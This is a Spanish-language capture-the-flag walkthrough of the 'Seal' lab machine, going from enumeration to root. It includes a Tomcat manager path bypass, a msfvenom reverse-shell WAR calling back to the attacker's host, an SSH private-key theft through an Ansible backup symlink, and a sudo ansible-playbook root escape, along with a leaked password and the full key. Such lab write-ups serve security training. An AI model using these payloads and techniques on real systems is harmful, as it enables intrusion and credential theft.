# Enumeration

>Comenzamos con un escaneo de puertos empleando el script de escaneo automático de puertos TCP creado por mí:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo AutoNmap.sh 10.129.95.190 
AutoNmap By JBKira
Puertos TCP abiertos:
22,443,8080
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-05T10:24:03
| Not valid after:  2022-05-05T10:24:03
| MD5:   9c4f:991a:bb97:192c:df5a:c513:057d:4d21
|_SHA-1: 0de4:6873:0ab7:3f90:c317:0f7b:872f:155b:305e:54ef
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Seal Market
8080/tcp open  http     Jetty
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

>Vamos a enumerar tecnologías web empleadas en ambos servicios web, alojados en los puertos 443 y 8080:

```bash
┌──(kali㉿jbkira)-[~]
└─$ whatweb https://10.129.95.190:443 && echo "------------------------" && whatweb 10.129.95.190:8080
https://10.129.95.190:443 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[admin@seal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.95.190], JQuery[3.0.0], Script, Title[Seal Market], X-UA-Compatible[IE=edge], nginx[1.18.0]
------------------------
http://10.129.95.190:8080 [401 Unauthorized] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.129.95.190]
```

>Si visitamos la página web servida en el puerto 443 podemos ver lo siguiente:

![image](https://github.com/user-attachments/assets/4c7f30dc-1a0c-4bc9-a26c-94f7bd52e3fd)

>No parece haber nada interesante por ahora por lo que vamos a pasar al servicio web alojado en el puerto 8080, el cual corresponde a un GitBucket:

![image](https://github.com/user-attachments/assets/8aae154d-5de5-49a0-b464-1c9838bc25ed)

>Nos registramos en el GitBucket:

![image](https://github.com/user-attachments/assets/5d277143-c23f-4d34-9b81-23c50ace3c33)

>Ahora podemos iniciar sesión y ver información dentro de los repositorios.

>Si vamos al commit siguiente y vamos a seal_market/tomcat/tomcat-users.xml podemos ver el usuario y contraseña de tomcat:

![image](https://github.com/user-attachments/assets/d0acfdf3-d13f-4db2-802d-f65978e46ea6)

![image](https://github.com/user-attachments/assets/e10d56ef-2b70-49c3-8e16-039d58d0873f)

`tomcat:42MrHBf*z8{Z%`

>Algunas versiones de Tomcat poseen una desconfiguración que permite realizar un pass traversal de la siguiente forma, permitiendonos llegar a /manager/html:

![image](https://github.com/user-attachments/assets/aff7ec0b-55a0-4d63-8738-14f3856fc6fd)

>Al probar las credenciales anteriores vemos que nos deja acceder al Tomcat Web Application Manager, donde podremos subir una reverse shell en formato WAR y poder ejecutar comandos remotamente:

![image](https://github.com/user-attachments/assets/6144fb5a-0d8b-40e8-afb9-78b881e1d283)

>Creación de la reverse shell:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/seal]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.133 LPORT=443 -f war > foca.war        
Payload size: 1091 bytes
Final size of war file: 1091 bytes

```

>Ahora deberemos establecer un listener con metasploit:

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD java/jsp_shell_reverse_tcp 
PAYLOAD => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.133
LHOST => 10.10.14.133
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.133:443
```

>Ahora subimos el archivo .war y lo deployeamos:

![image](https://github.com/user-attachments/assets/1d95ddce-d523-4ed0-ad96-bb1bb732106f)

>Al tratar de subirlo dará un error de que no tenemos permiso pero deberemos emplear otra URL para poder engañar al parser y que nos deje acceder, esta vez usaremos la siguiente url:

```url
https://10.129.95.190/manager;name=orange/html/
```

>Una vez accedido mediante esa URL habremos roto la lógica del parser y habremos logrado subir la reverse shell, al ejecutarla vemos que nos devuelve una shell:

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.133:443 
[*] Command shell session 1 opened (10.10.14.133:443 -> 10.129.95.190:49486) at 2025-04-17 15:05:37 -0400

whoami
tomcat
```

# Privilege Escalation

>Pasamos linpeas.sh a la máquina víctima y al ejecutarlo vemos lo siguiente:

```bash
╔══════════╣ Backup folders
drwxr-xr-x 4 luis luis 4096 Apr 17 19:10 /opt/backups                                                                                                      
total 8
drwxrwxr-x 2 luis luis 4096 Apr 17 19:10 archives
drwxrwxr-x 2 luis luis 4096 May  7  2021 playbook
```

>Aquí vemos lo que puede ser un servicio de backups temporales con un playbook en el interior del directorio encontrado:

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

>Esto podríamos explotarlo creando un enlace simbólico en el directorio a copiar por el playbook de Ansible que apunte al id_rsa (clave privada de SSH) del usuario luis, siendo posible debido a que la opción copy_links esta habilitada ya que permite la copia de enlaces simbólicos:

```bash
tomcat@seal:/opt/backups/playbook$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/id_rsa id_rsa
ln -s /home/luis/.ssh/id_rsa id_rsa
```

>Al hacerse el backup nos llevamos el archivo resultante a /tmp para descomprimirlo:

```bash
tomcat@seal:/opt/backups/archives$ cp backup-2025-04-17-19:21:32.gz /tmp
cp backup-2025-04-17-19:21:32.gz /tmp

tomcat@seal:/tmp$ tar -xvf ./backup-2025-04-17-19:21:32.gz
<SNIP>
dashboard/uploads/id_rsa
<SNIP>
```

>Ahora vamos a abrir el id_rsa para ver su contenido y poder pivotar al usuario luis:

```bash
tomcat@seal:/tmp$ cat dashboard/uploads/id_rsa
cat dashboard/uploads/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

>Creamos el id_rsa en nuestra máquina kali y le damos permisos 700:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/seal]
└─$ chmod 700 id_rsa
```

>Y ahora nos conectamos como el usuario Luis mediante SSH:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/seal]
└─$ ssh -i id_rsa luis@10.129.95.190                                                                   
<SNIP>

luis@seal:~$ 
```

>Aquí podemos ver la flag user.txt:

```bash
luis@seal:~$ ls
gitbucket.war  user.txt
```

>Si listamos los permisos de sudoers del usuario vemos que puede ejecutar ansible-playbook como cualquier usuario, lo que nos puede permitir escalar privilegios:

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

>Para escalar privilegios aprovechandonos de esto, deberemos ejecutar los siguientes dos comandos, que nos spawnearán una shell como root:

```bash
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ***********************************************************************************************************************************************************

TASK [Gathering Facts] *****************************************************************************************************************************************************
ok: [localhost]

TASK [shell] ***************************************************************************************************************************************************************
# whoami
root
```

>Donde ya podemos ver la flag root.txt:

```bash
root@seal:~# ls
root.txt  snap
```

